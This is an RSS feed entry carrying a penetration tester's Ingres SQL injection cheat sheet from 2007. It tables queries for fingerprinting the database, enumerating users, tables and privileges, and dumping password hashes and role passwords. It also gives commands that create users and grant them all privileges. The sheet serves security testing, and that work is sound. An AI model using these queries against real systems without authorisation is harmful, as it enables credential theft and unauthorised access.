		<pubDate>Sat, 07 Jul 2007 10:40:23 +0000</pubDate>
				<category><![CDATA[SQL Injection]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[database]]></category>
		<category><![CDATA[ingres]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=83</guid>

					<description><![CDATA[Ingres seems to be one of the less common database backends for web applications, so I thought it would be worth installing it and making some notes to make my next Ingres-based web app test a little easier. Below are some tabulated notes on how to do many of thing you&#8217;d normally do via SQL [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Ingres seems to be one of the less common database backends for web applications, so I thought it would be worth installing it and making some notes to make my next Ingres-based web app test a little easier.</p>
<p><span id="more-83"></span></p>
<p>Below are some tabulated notes on how to do many of thing you&#8217;d normally do via SQL injection.  All tests were performed on Ingres 9.2.0 alpha Build 108 for Linux.  The Ingres download page is <a href="http://ingres.com/downloads/prod-comm-download.php">here</a>.</p>
<p>This page will probably remain a work-in-progress for some time yet.  I&#8217;ll update it as I learn more.</p>
<p>This post is part of series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.</p>
<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:</p>
<ul>
<li><a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
<li><a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
<li><a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
<li><a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
<li><a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
</ul>
<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>select dbmsinfo(&#8216;_version&#8217;);</td>
</tr>
<tr>
<td>Comments</td>
<td>SELECT 123; &#8212; comment<br />
select 123; /* comment */</td>
</tr>
<tr>
<td>Current User</td>
<td>select dbmsinfo(&#8216;session_user&#8217;);<br />
select dbmsinfo(&#8216;system_user&#8217;);</td>
</tr>
<tr>
<td>List Users</td>
<td>First connect to iidbdb, then:<br />
SELECT name, password FROM iiuser; &#8212; or<br />
SELECT own FROM iidatabase;</td>
</tr>
<tr>
<td>Create Users</td>
<td>create user testuser with password = &#8216;testuser&#8217;;&#8211; priv</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>First connect to iidbdb, then:<br />
select name, password from iiuser;</td>
</tr>
<tr>
<td>List Privileges</td>
<td>select dbmsinfo(&#8216;db_admin&#8217;);<br />
select dbmsinfo(&#8216;create_table&#8217;);<br />
select dbmsinfo(&#8216;create_procedure&#8217;);<br />
select dbmsinfo(&#8216;security_priv&#8217;);<br />
select dbmsinfo(&#8216;select_syscat&#8217;);<br />
select dbmsinfo(&#8216;db_privileges&#8217;);<br />
select dbmsinfo(&#8216;current_priv_mask&#8217;);</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>TODO</td>
</tr>
<tr>
<td>Current Database</td>
<td>select dbmsinfo(&#8216;database&#8217;);</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT name FROM iidatabase; &#8212; connect to iidbdb</td>
</tr>
<tr>
<td>List Columns</td>
<td>select column_name, column_datatype, table_name, table_owner from iicolumns;</td>
</tr>
<tr>
<td>List Tables</td>
<td>select table_name, table_owner from iitables;<br />
select relid, relowner, relloc from iirelation;<br />
select relid, relowner, relloc from iirelation where relowner != &#8216;$ingres&#8217;;</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>SELECT table_name, table_owner FROM iicolumns WHERE column_name = &#8216;value&#8217;</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>Astoundingly, this <a href="http://community.ingres.com/forums/viewtopic.php?p=6050">doesn&#8217;t</a>seem to be possible!  This is as close as you can get:select top 10 blah from table;<br />
select first 10 blah form table;</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>select substr(&#8216;abc&#8217;, 2, 1); &#8212; returns &#8216;b&#8217;</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>The function &#8220;bit_and&#8221; exists, but seems hard to use.  Here&#8217;s an<br />
example of ANDing 3 and 5 together.  The result is a &#8220;byte&#8221; type<br />
with value ?01:select substr(bit_and(cast(3 as byte), cast(5 as byte)),1,1);</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>TODO</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>TODO<br />
(The &#8220;ascii&#8221; function exists, but doesn&#8217;t seem to do what I&#8217;d expect.)</td>
</tr>
<tr>
<td>Casting</td>
<td>select cast(123 as varchar);<br />
select cast(&#8216;123&#8217; as integer);</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>select &#8216;abc&#8217; || &#8216;def&#8217;;</td>
</tr>
<tr>
<td>If Statement</td>
<td>TODO</td>
</tr>
<tr>
<td>Case Statement</td>
<td>TODO</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>TODO</td>
</tr>
<tr>
<td>Time Delay</td>
<td>???See <a href="http://www.microsoft.com/technet/community/columns/secmvp/sv0907.mspx">Heavy Queries</a> article for some ideas.</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>TODO</td>
</tr>
<tr>
<td>Command Execution</td>
<td>Impossible?</td>
</tr>
<tr>
<td>Local File Access</td>
<td>TODO</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT dbmsinfo(&#8216;ima_server&#8217;)</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>SELECT dbdev, ckpdev, jnldev, sortdev FROM iidatabase WHERE name = &#8216;value&#8217; &#8212; primary location of db<br />
SELECT lname FROM iiextend WHERE dname = &#8216;value&#8217; &#8212; extended location of db<br />
SELECT are FROM iilocations where lname = &#8216;value&#8217; &#8212; all area (ie directory) linked with a location</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>SELECT name FROM iidatabase WHERE own = &#8216;$ingres&#8217; &#8212; connect to iidbdb</td>
</tr>
<tr>
<td>Installing Locally</td>
<td>The Ingres database can be downloaded for free from <a href="http://esd.ingres.com/">http://esd.ingres.com/</a><br />
A pre-built Linux-based Ingres Database Server can be download from <a href="http://www.vmware.com/appliances/directory/832">http://www.vmware.com/appliances/directory/832</a></td>
</tr>
<tr>
<td>Database Client</td>
<td>TODO<br />
There is a client called &#8220;sql&#8221; which can be used for local connections (at least) in the  database server package above.</td>
</tr>
<tr>
<td>Logging in from command line</td>
<td>$ su &#8211;  ingres<br />
$ sql iidbdb<br />
* select dbmsinfo(&#8216;_version&#8217;); go</td>
</tr>
<tr>
<td>Identifying on the network</td>
<td>TODO</td>
</tr>
</tbody>
</table>
<p>The following areas are interesting enough to include on this page, but I haven&#8217;t researched them for other databases:</p>
<table border="1">
<tbody>
<tr>
<td><strong>Description</strong></td>
<td><strong>SQL / Comments </strong></td>
</tr>
<tr>
<td> Batching Queries Allowed?</td>
<td>Not via DBI in PERL.  Subsequent statements seem to get ignored:<br />
select blah from table where foo = 1; select &#8230; doesn&#8217;t matter this is ignored.</td>
</tr>
<tr>
<td> FROM clause mandated in SELECTs?</td>
<td>No.  You don&#8217;t need to select form &#8220;dual&#8221; or anything.  The following is legal:<br />
select 1;</td>
</tr>
<tr>
<td> UNION supported</td>
<td>Yes.  Nothing tricky here.  The following is legal:<br />
select 1 union select 2;</td>
</tr>
<tr>
<td> Enumerate Tables Privs</td>
<td>select table_name, permit_user, permit_type from iiaccess;</td>
</tr>
<tr>
<td> Length of a string</td>
<td>select length(&#8216;abc&#8217;); &#8212; returns 3</td>
</tr>
<tr>
<td> Roles and passwords</td>
<td>First you need to connect to iidbdb, then:<br />
select roleid, rolepass from iirole;</td>
</tr>
<tr>
<td>List Database Procedures</td>
<td>First you need to connect to iidbdb, then:<br />
select dbp_name,  dbp_owner from iiprocedure;</td>
</tr>
<tr>
<td>Create Users + Granting Privs</td>
<td>First you need to connect to iidbdb, then:<br />
create user pm with password = &#8216;password&#8217;;<br />
grant all on current installation to pm;</td>
</tr>
</tbody>
</table>
<p><span class="Apple-style-span" style="color: #000000; font-size: 17px; line-height: 25px;">Thanks</span></p>
<p>Pentestmonkey gratefully acknowledges the contributions of:</p>
<p>Jean-Pierre Zuate</p>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
